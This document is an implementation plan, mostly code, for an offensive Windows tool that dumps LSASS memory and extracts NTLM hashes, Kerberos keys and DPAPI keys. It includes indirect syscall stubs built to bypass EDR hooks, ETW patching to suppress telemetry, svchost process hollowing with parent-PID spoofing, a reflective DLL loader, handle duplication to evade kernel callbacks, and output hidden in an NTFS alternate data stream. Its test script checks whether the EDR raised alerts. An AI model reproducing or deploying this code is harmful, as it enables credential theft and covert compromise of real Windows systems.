# Plan 1 — LSASS Memory Dump: Implementation Plan

> **Target**: T1003.001 | **Pre-condition**: SYSTEM (assumed) | **Focus**: Dump only

---

## 0. Project Structure

```
OS_dump/Plan1_LSASS/
├── SPEC.md                     ← Technical spec (Plan1_LSASS_Dump_SPEC.md)
├── IMPL.md                     ← This file
├── build.bat                   ← MSVC build
├── src/
│   ├── main.c                  ← CLI entry point
│   ├── privilege.c/h           ← SeDebugPrivilege
│   ├── staging.c/h             ← Process hollowing
│   ├── syscall_resolver.c/h    ← Syscall# from disk ntdll
│   ├── syscall_stubs.asm       ← Indirect syscall asm
│   ├── etw_patch.c/h           ← ETW suppression
│   ├── lsass_reader.c/h        ← LSASS handle + read
│   ├── minidump_engine.c/h     ← Custom minidump
│   ├── cred_extractor.c/h      ← Credential parsing
│   ├── ads_writer.c/h          ← ADS output
│   ├── cleanup.c/h             ← Cleanup routines
│   ├── reflective_loader.c/h   ← Reflective PE loader
│   └── crypto/
│       ├── chacha20.c/h
│       ├── sha256.c/h
│       └── lznt1.c/h
├── test/
│   ├── run_test.ps1            ← Automated test
│   ├── verify_creds.py         ← Credential verification
│   └── detect_check.ps1        ← EDR alert check
└── output/                     ← Test results (gitignored)
```

---

## 1. Build Instructions

### 1.1 Prerequisites
```
- Visual Studio 2022 (Build Tools or Community)
- Windows SDK 10.0.22621+
- x64 Native Tools Command Prompt
```

### 1.2 Build Script

```batch
@echo off
REM build.bat — Plan 1 LSASS Dump Tool
call "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"

set CFLAGS=/nologo /O2 /MT /GS- /GL /W3 /WX- /Z7 ^
           /D "WIN32_LEAN_AND_MEAN" /D "NDEBUG" /D "_CONSOLE"

set LFLAGS=/NOLOGO /OPT:REF /OPT:ICF /DYNAMICBASE /NXCOMPAT

cl.exe %CFLAGS% /Fe"LSASSDump.exe" ^
    src\main.c src\privilege.c src\staging.c ^
    src\syscall_resolver.c src\etw_patch.c ^
    src\lsass_reader.c src\minidump_engine.c ^
    src\cred_extractor.c src\ads_writer.c ^
    src\cleanup.c src\reflective_loader.c ^
    src\crypto\chacha20.c src\crypto\sha256.c src\crypto\lznt1.c ^
    src\syscall_stubs.asm ^
    /link %LFLAGS% kernel32.lib ntdll.lib advapi32.lib

echo Build complete: LSASSDump.exe
```

---

## 2. Core Implementation

### 2.1 Main Entry Point

```c
// main.c
#include "common.h"

typedef enum { CMD_DUMP_FULL, CMD_DUMP_ONLY, CMD_PARSE, CMD_OUTPUT_ADS,
               CMD_OUTPUT_FILE, CMD_WHOAMI, CMD_CLEANUP } COMMAND;

int wmain(int argc, WCHAR* argv[]) {
    COMMAND cmd = ParseCommandLine(argc, argv);
    
    switch (cmd) {
    case CMD_DUMP_FULL:
        return DumpFull();
    case CMD_DUMP_ONLY:
        return DumpOnly();
    case CMD_PARSE:
        return ParseExisting(argv[2]);
    case CMD_WHOAMI:
        return CheckPrivilege();
    case CMD_CLEANUP:
        return DoCleanup();
    }
    return 0;
}

// ─── Full Dump Flow ───
int DumpFull() {
    PBYTE dumpBuffer = NULL;
    SIZE_T dumpSize = 0;
    HANDLE hStaging = NULL, hLsass = NULL;
    
    wprintf(L"[*] Plan 1: LSASS Memory Dump via Indirect Syscall\n");
    
    // Step 1: Enable SeDebugPrivilege
    wprintf(L"[1/7] Enabling SeDebugPrivilege... ");
    NTSTATUS st = EnableDebugPrivilege();
    if (!NT_SUCCESS(st)) { wprintf(L"FAILED (0x%08X)\n", st); return 1; }
    wprintf(L"OK\n");
    
    // Step 2: Create hollowed staging process
    wprintf(L"[2/7] Creating hollowed staging process... ");
    st = CreateHollowedProcess(L"svchost.exe -k LocalService", &hStaging, NULL);
    if (!NT_SUCCESS(st)) { wprintf(L"FAILED (0x%08X)\n", st); return 2; }
    wprintf(L"OK (PID: %d)\n", GetProcessId(hStaging));
    
    // Step 3: Inject reflective dumper DLL into staging
    wprintf(L"[3/7] Injecting reflective dumper DLL + patching ETW... ");
    st = InjectReflectiveDll(hStaging, g_DumperDll, g_DumperDllSize);
    if (!NT_SUCCESS(st)) { wprintf(L"FAILED (0x%08X)\n", st); return 3; }
    // ETW patching happens inside DllMain of reflective DLL
    wprintf(L"OK\n");
    
    // Step 4: Open LSASS handle (from staging process)
    DWORD lsassPid = FindLsassPid();
    wprintf(L"[4/7] LSASS PID: %d\n", lsassPid);
    wprintf(L"     Opening LSASS handle via indirect syscall... ");
    hLsass = RemoteOpenLsassHandle(hStaging, lsassPid);
    if (!hLsass) { wprintf(L"FAILED\n"); return 4; }
    wprintf(L"OK (Handle: 0x%p)\n", hLsass);
    
    // Step 5: Dump LSASS memory
    wprintf(L"[5/7] Dumping LSASS memory... ");
    st = RemoteDumpLsass(hStaging, hLsass, &dumpBuffer, &dumpSize);
    if (!NT_SUCCESS(st)) { wprintf(L"FAILED (0x%08X)\n", st); return 5; }
    wprintf(L"OK (%lld bytes)\n", dumpSize);
    
    // Step 6: Extract credentials from dump
    wprintf(L"[6/7] Extracting credentials...\n");
    DWORD credCount = ExtractCredentials(dumpBuffer, dumpSize);
    wprintf(L"     Extracted %d credential entries\n", credCount);
    
    // Step 7: Encrypt + output
    wprintf(L"[7/7] Encrypting + writing output... ");
    st = EncryptAndWriteAds(dumpBuffer, dumpSize);
    if (!NT_SUCCESS(st)) { wprintf(L"FAILED\n"); return 7; }
    wprintf(L"OK\n");
    
    // Cleanup
    CleanupAll(hStaging, hLsass, dumpBuffer);
    wprintf(L"[*] Dump complete. Output in ADS.\n");
    return 0;
}
```

### 2.2 Indirect Syscall Implementation

```c
// syscall_resolver.c
// Resolve syscall numbers from CLEAN ntdll.dll on disk (not hooked in-memory)

typedef struct _SYSCALL_ENTRY {
    PWSTR name;
    DWORD syscallNumber;
    PVOID stubAddress;       // points to syscall;ret stub
} SYSCALL_ENTRY;

static SYSCALL_ENTRY g_Syscalls[] = {
    { L"NtOpenProcess",           0, NULL },
    { L"NtReadVirtualMemory",     0, NULL },
    { L"NtQueryVirtualMemory",    0, NULL },
    { L"NtQuerySystemInformation", 0, NULL },
    { L"NtAllocateVirtualMemory",  0, NULL },
    { L"NtWriteVirtualMemory",    0, NULL },
    { L"NtProtectVirtualMemory",  0, NULL },
    { L"NtCreateUserProcess",     0, NULL },
    { L"NtUnmapViewOfSection",    0, NULL },
    { L"NtClose",                 0, NULL },
    { L"NtFreeVirtualMemory",     0, NULL },
    { L"NtOpenProcessToken",      0, NULL },
    { NULL, 0, NULL }
};

// Read clean ntdll.dll from disk and extract syscall numbers
BOOL ResolveAllSyscallNumbers() {
    WCHAR system32Path[MAX_PATH];
    GetSystemDirectoryW(system32Path, MAX_PATH);
    
    WCHAR ntdllPath[MAX_PATH];
    swprintf(ntdllPath, MAX_PATH, L"%s\\ntdll.dll", system32Path);
    
    // Map clean ntdll.dll from disk
    HANDLE hFile = CreateFileW(ntdllPath, GENERIC_READ, FILE_SHARE_READ,
        NULL, OPEN_EXISTING, 0, NULL);
    HANDLE hMapping = CreateFileMappingW(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    PBYTE ntdllBase = (PBYTE)MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    
    // Walk PE export table
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ntdllBase;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(ntdllBase + dos->e_lfanew);
    
    DWORD exportRVA = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)(ntdllBase + exportRVA);
    
    PDWORD names = (PDWORD)(ntdllBase + exports->AddressOfNames);
    PWORD ordinals = (PWORD)(ntdllBase + exports->AddressOfNameOrdinals);
    PDWORD functions = (PDWORD)(ntdllBase + exports->AddressOfFunctions);
    
    for (int i = 0; g_Syscalls[i].name != NULL; i++) {
        for (DWORD j = 0; j < exports->NumberOfNames; j++) {
            PCHAR exportName = (PCHAR)(ntdllBase + names[j]);
            WCHAR wName[256];
            mbstowcs(wName, exportName, 256);
            
            if (wcscmp(wName, g_Syscalls[i].name) == 0) {
                // Syscall number = byte 4 of the stub (after mov r10, rcx; mov eax, XX)
                PBYTE stub = ntdllBase + functions[ordinals[j]];
                g_Syscalls[i].syscallNumber = *(PDWORD)(stub + 4);
                
                // Create stub: mov r10, rcx; mov eax, <N>; syscall; ret
                g_Syscalls[i].stubAddress = CreateSyscallStub(g_Syscalls[i].syscallNumber);
                break;
            }
        }
    }
    
    UnmapViewOfFile(ntdllBase);
    CloseHandle(hMapping);
    CloseHandle(hFile);
    return TRUE;
}
```

```asm
; syscall_stubs.asm — Indirect syscall stubs
; Each stub: mov r10, rcx / mov eax, <syscall#> / syscall / ret
; Bypasses ntdll.dll userland hooks entirely

.CODE

; Macro to generate stub per function
MAKE_SYSCALL MACRO name, number
name PROC
    mov     r10, rcx
    mov     eax, number
    syscall
    ret
name ENDP
ENDM

; Generated stubs (syscall numbers filled at runtime)
; Template: allocate RWX, copy template, patch eax value, protect RX

MAKE_SYSCALL SysNtOpenProcess,           026h
MAKE_SYSCALL SysNtReadVirtualMemory,     03Fh
MAKE_SYSCALL SysNtQueryVirtualMemory,    023h
MAKE_SYSCALL SysNtQuerySystemInformation, 036h
MAKE_SYSCALL SysNtAllocateVirtualMemory,  018h
MAKE_SYSCALL SysNtWriteVirtualMemory,    03Ah
MAKE_SYSCALL SysNtProtectVirtualMemory,  050h
MAKE_SYSCALL SysNtCreateUserProcess,     0C8h
MAKE_SYSCALL SysNtUnmapViewOfSection,    02Ah
MAKE_SYSCALL SysNtClose,                 00Fh
MAKE_SYSCALL SysNtFreeVirtualMemory,     01Eh

END
```

### 2.3 ETW Patching

```c
// etw_patch.c
// Patch EtwEventWrite in ntdll.dll (in staging process context)

VOID PatchEtwEventWrite(HANDLE hProcess) {
    // Pattern for x64 EtwEventWrite:
    //  mov     [rsp+8h], rbx        ; 48 89 5C 24 08
    //  mov     [rsp+10h], rsi       ; 48 89 74 24 10
    //  ...
    //
    // Replace with:
    //  xor     eax, eax             ; 33 C0
    //  ret                           ; C3
    
    PBYTE etwEventWrite = (PBYTE)GetProcAddress(
        GetModuleHandleW(L"ntdll.dll"), "EtwEventWrite");
    
    BYTE patch[] = { 0x33, 0xC0, 0xC3 };  // xor eax, eax; ret
    
    DWORD oldProtect;
    SysNtProtectVirtualMemory(hProcess, etwEventWrite, sizeof(patch),
        PAGE_EXECUTE_READWRITE, &oldProtect);
    
    BYTE savedBytes[sizeof(patch)];
    SysNtReadVirtualMemory(hProcess, etwEventWrite, savedBytes, sizeof(patch), NULL);
    
    SysNtWriteVirtualMemory(hProcess, etwEventWrite, patch, sizeof(patch), NULL);
    SysNtProtectVirtualMemory(hProcess, etwEventWrite, sizeof(patch), oldProtect, &oldProtect);
}

VOID PatchEtwNotificationRegister(HANDLE hProcess) {
    // Disable Threat Intelligence provider registration
    PBYTE fn = (PBYTE)GetProcAddress(
        GetModuleHandleW(L"ntdll.dll"), "EtwNotificationRegister");
    
    BYTE patch[] = { 0x33, 0xC0, 0xC3 };  // xor eax, eax; ret (fail silently)
    
    DWORD oldProtect;
    SysNtProtectVirtualMemory(hProcess, fn, sizeof(patch),
        PAGE_EXECUTE_READWRITE, &oldProtect);
    SysNtWriteVirtualMemory(hProcess, fn, patch, sizeof(patch), NULL);
    SysNtProtectVirtualMemory(hProcess, fn, sizeof(patch), oldProtect, &oldProtect);
}
```

### 2.4 Credential Extraction from Minidump

```c
// cred_extractor.c
// Parse LSASS memory dump to extract credentials
// Reference: mimikatz sekurlsa module patterns (our own implementation)

typedef struct _LSASS_MODULE {
    PWSTR name;
    DWORD64 baseAddress;
    DWORD   size;
} LSASS_MODULE;

// Find loaded modules in minidump
DWORD FindModulesInDump(PBYTE dump, SIZE_T size, LSASS_MODULE** modules);

// ─── NTLM Hash Extraction (from MSV1_0.dll) ───
DWORD ExtractNtlmHashes(PBYTE dump, SIZE_T size, NTLM_CRED** outCreds) {
    LSASS_MODULE* modules = NULL;
    DWORD moduleCount = FindModulesInDump(dump, size, &modules);
    
    // Find MSV1_0.dll
    LSASS_MODULE* msv = NULL;
    for (DWORD i = 0; i < moduleCount; i++) {
        if (wcsstr(modules[i].name, L"MSV1_0.dll")) {
            msv = &modules[i];
            break;
        }
    }
    if (!msv) return 0;
    
    // Scan MSV1_0.dll memory for credential list signatures
    // Pattern: _MSV1_0_LIST_63 (or _MSV1_0_LIST_61 on older builds)
    // Structure contains linked list of _MSV1_0_PRIMARY_CREDENTIALS
    // Each entry has: UserName, NtOwfPassword (NT hash), LmOwfPassword (LM hash)
    
    PBYTE msvData = dump + (msv->baseAddress - modules[0].baseAddress);
    
    // Signature scan for credential list pointer
    BYTE pattern[] = { 0x48, 0x8D, 0x0D, 0xCC, 0xCC, 0xCC, 0xCC }; // lea rcx, [LIST]
    DWORD64 listAddr = FindPatternWithWildcard(msvData, msv->size, pattern, sizeof(pattern));
    
    // Walk credential entries → extract Username + NTLM hash
    // ... (detailed parsing)
    
    return entryCount;
}

// ─── Kerberos Key Extraction (from lsasrv.dll) ───
DWORD ExtractKerberosKeys(PBYTE dump, SIZE_T size, KERBEROS_KEY** outKeys) {
    LSASS_MODULE* lsasrv = FindModuleByName(dump, size, L"lsasrv.dll");
    if (!lsasrv) return 0;
    
    // Scan lsasrv.dll memory for _KIWI_KERBEROS_PRIMARY_CREDENTIALS
    // Each entry: UserName, Password (plaintext), keys (AES256, AES128, DES)
    
    // Pattern: KERB_ETYPE_AES256_CTS_HMAC_SHA1_96 = 0x12
    // Look for key structures with valid etype values
    
    // ... (detailed parsing)
    
    return keyCount;
}

// ─── DPAPI Key Extraction (from dpapisrv.dll) ───
DWORD ExtractDpapiKeys(PBYTE dump, SIZE_T size, DPAPI_KEY** outKeys) {
    LSASS_MODULE* dpapi = FindModuleByName(dump, size, L"dpapisrv.dll");
    if (!dpapi) return 0;
    
    // Extract DPAPI backup keys (used to decrypt user master keys)
    // Pattern: GUID {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
    
    // ... (detailed parsing)
    
    return keyCount;
}
```

### 2.5 Handle Duplication Fallback (Evade ObRegisterCallbacks)

```c
// lsass_reader.c — Alternative: duplicate LSASS handle from legitimate process
// EDR ObRegisterCallbacks can block direct NtOpenProcess(LSASS_PID)
// Bypass: find process that already has LSASS handle → duplicate it

HANDLE OpenLsassViaHandleDup(DWORD lsassPid) {
    // Enumerate all handles in system
    ULONG handleInfoSize = 0;
    NtQuerySystemInformation(SystemExtendedHandleInformation, NULL, 0, &handleInfoSize);
    PSYSTEM_HANDLE_INFORMATION_EX handleInfo = malloc(handleInfoSize);
    NtQuerySystemInformation(SystemExtendedHandleInformation, handleInfo, handleInfoSize, NULL);
    
    for (ULONG i = 0; i < handleInfo->NumberOfHandles; i++) {
        SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX* entry = &handleInfo->Handles[i];
        
        // Find handles to LSASS process
        if (entry->UniqueProcessId != lsassPid) continue;
        
        // Check owner process — is it "legitimate"?
        // e.g., taskmgr.exe, procexp64.exe, WmiPrvSE.exe, security products
        if (!IsLegitimateProcess(entry->ObjectProcessId)) continue;
        
        // Duplicate handle from legitimate process
        HANDLE hSource = SysNtOpenProcess(PROCESS_DUP_HANDLE, FALSE,
            &(CLIENT_ID){ (HANDLE)entry->ObjectProcessId, NULL });
        if (!hSource) continue;
        
        HANDLE hDup = NULL;
        NTSTATUS st = NtDuplicateObject(hSource, (HANDLE)entry->HandleValue,
            NtCurrentProcess(), &hDup,
            PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, 0, 0);
        CloseHandle(hSource);
        
        if (NT_SUCCESS(st)) {
            free(handleInfo);
            return hDup;  // Got a valid LSASS handle without direct NtOpenProcess
        }
    }
    free(handleInfo);
    return NULL;  // Fallback failed
}
```

---

## 3. Staging Process (Process Hollowing) Detail

```c
// staging.c
NTSTATUS CreateHollowedProcess(PWSTR cmdLine, PHANDLE phProcess, PHANDLE phThread) {
    // 1. Create suspended process
    STARTUPINFOEXW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    
    // PPID spoofing: set parent = services.exe
    DWORD servicesPid = FindProcessPid(L"services.exe");
    HANDLE hParent = SysNtOpenProcess(PROCESS_CREATE_PROCESS, FALSE,
        &(CLIENT_ID){ (HANDLE)servicesPid, NULL });
    
    SIZE_T attrSize = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(attrSize);
    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize);
    
    UpdateProcThreadAttribute(si.lpAttributeList, 0,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
        &hParent, sizeof(hParent), NULL, NULL);
    
    WCHAR appPath[MAX_PATH] = L"C:\\Windows\\System32\\svchost.exe";
    CreateProcessW(appPath, cmdLine, NULL, NULL, FALSE,
        EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED,
        NULL, NULL, &si.StartupInfo, &pi);
    
    // 2. Get image base address from PEB
    PROCESS_BASIC_INFORMATION pbi = { 0 };
    NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);
    
    PEB peb = { 0 };
    SysNtReadVirtualMemory(pi.hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), NULL);
    PVOID imageBase = peb.ImageBaseAddress;  // save before unmap
    
    // 3. Unmap original image
    SysNtUnmapViewOfSection(pi.hProcess, imageBase);
    
    // 4. Allocate memory at preferred base of reflective DLL
    PVOID newBase = imageBase;  // reuse same base
    SIZE_T dllSize = g_ReflectiveDllSize;
    SysNtAllocateVirtualMemory(pi.hProcess, &newBase, 0, &dllSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    // 5. Write reflective DLL headers + sections
    SysNtWriteVirtualMemory(pi.hProcess, newBase,
        g_ReflectiveDll, g_ReflectiveDllSize, NULL);
    
    // 6. Update PEB ImageBaseAddress
    SysNtWriteVirtualMemory(pi.hProcess,
        (PBYTE)pbi.PebBaseAddress + offsetof(PEB, ImageBaseAddress),
        &newBase, sizeof(newBase), NULL);
    
    // 7. Change .text to RX (from RWX) — avoid RWX memory scan
    FinalizeSections(pi.hProcess, newBase);
    
    *phProcess = pi.hProcess;
    if (phThread) *phThread = pi.hThread;
    return STATUS_SUCCESS;
}
```

---

## 4. Reflective DLL (Dumper Payload)

```c
// reflective_loader.c — runs inside hollowed svchost.exe

BOOL WINAPI ReflectiveLoader(PVOID lpReserved) {
    // 1. Find kernel32/ntdll base via PEB (hash lookup, not name)
    PPEB peb = (PPEB)__readgsqword(0x60);
    PLDR_DATA_TABLE_ENTRY ntdll = FindModuleByHash(peb->Ldr, NTDLL_HASH);
    PLDR_DATA_TABLE_ENTRY kernel32 = FindModuleByHash(peb->Ldr, KERNEL32_HASH);
    
    // 2. Resolve all needed functions by hash
    pNtOpenProcess fnNtOpenProcess = FindFuncByHash(ntdll, NT_OPEN_PROCESS_HASH);
    pNtReadVirtualMemory fnNtReadVm = FindFuncByHash(ntdll, NT_READ_VM_HASH);
    // ... etc
    
    // 3. Parse own PE from memory
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)&ReflectiveLoader;
    // Walk back to find DOS header (search for MZ)
    while (dos->e_magic != IMAGE_DOS_SIGNATURE) dos = (PIMAGE_DOS_HEADER)((PBYTE)dos - 1);
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)dos + dos->e_lfanew);
    
    // 4. Allocate new image memory
    PVOID newImage = NULL;
    SIZE_T imageSize = nt->OptionalHeader.SizeOfImage;
    fnNtAllocateVirtualMemory(NtCurrentProcess(), &newImage, 0, &imageSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    // 5. Copy headers + sections
    memcpy(newImage, dos, nt->OptionalHeader.SizeOfHeaders);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sec[i].SizeOfRawData) {
            memcpy((PBYTE)newImage + sec[i].VirtualAddress,
                   (PBYTE)dos + sec[i].PointerToRawData,
                   sec[i].SizeOfRawData);
        }
    }
    
    // 6. Process relocations
    ULONG_PTR delta = (ULONG_PTR)newImage - nt->OptionalHeader.ImageBase;
    if (delta) {
        // Walk .reloc section, apply base relocations
        ProcessRelocations(newImage, delta);
    }
    
    // 7. Resolve IAT
    ResolveImportTable(newImage, kernel32, ntdll);
    
    // 8. Patch ETW (before any operations)
    pEtwEventWrite etwWrite = FindFuncByHash(ntdll, ETW_EVENT_WRITE_HASH);
    PatchFunction(etwWrite);  // → xor eax,eax; ret
    
    // 9. Finalize protection (.text=RX, .rdata=R, .data=RW)
    FinalizeSections(newImage);
    
    // 10. Call DllMain with DLL_PROCESS_ATTACH
    PDLL_MAIN dllMain = (PDLL_MAIN)((PBYTE)newImage + nt->OptionalHeader.AddressOfEntryPoint);
    return dllMain((HINSTANCE)newImage, DLL_PROCESS_ATTACH, lpReserved);
}
```

---

## 5. Test Script

```powershell
# test/run_test.ps1
param([switch]$SkipCleanup)

$TOOL = ".\LSASSDump.exe"
$LOG  = ".\output\test_$(Get-Date -Format 'yyyyMMdd_HHmmss').log"

function Log($m) { "$(Get-Date -Format 'HH:mm:ss') $m" | Tee-Object $LOG -Append }

# ─── Pre-check ───
Log "=== LSASS DUMP TEST ==="
Log "Checking SYSTEM privilege..."
$whoami = & $TOOL --whoami 2>&1
Log $whoami

# ─── Run dump ───
Log "Starting full dump..."
$sw = [Diagnostics.Stopwatch]::StartNew()
$result = & $TOOL --dump-full 2>&1
$sw.Stop()
Log "Dump completed in $($sw.Elapsed.TotalSeconds)s"
Log $result

# ─── Verify ───
Log "Verifying output..."
$adsPath = "C:\Windows\System32\config\software.log:lsass"
$adsContent = Get-Content $adsPath -Raw -EA SilentlyContinue
if ($adsContent) {
    Log "ADS found: $($adsContent.Length) bytes"
    python3 verify_creds.py --input-ads "$adsPath" --output ".\output\creds.txt"
    
    if (Test-Path ".\output\creds.txt") {
        $lines = (Get-Content ".\output\creds.txt").Count
        Log "Extracted $lines credential lines"
    }
} else {
    Log "ERROR: No ADS output found!"
}

# ─── EDR Check ───
Log "Checking EDR alerts..."
& .\detect_check.ps1 | Tee-Object $LOG -Append

# ─── Cleanup ───
if (-not $SkipCleanup) {
    Log "Running cleanup..."
    & $TOOL --cleanup
}

Log "=== TEST COMPLETE ==="
```

---

## 6. PPL Bypass Notes (Future)

When LSASS runs as Protected Process Light (`RunAsPPL=1`):
- `NtOpenProcess(PROCESS_VM_READ)` → `STATUS_ACCESS_DENIED`
- Only kernel drivers can bypass PPL
- Options:
  - Use `PROCESS_QUERY_LIMITED_INFORMATION` (limited access)
  - Load kernel driver (BYOVD) to strip PPL flag from LSASS EPROCESS
  - Use Windows Error Reporting (WER) to capture LSASS dump (legitimate path)

For this implementation, PPL bypass is marked as future work.
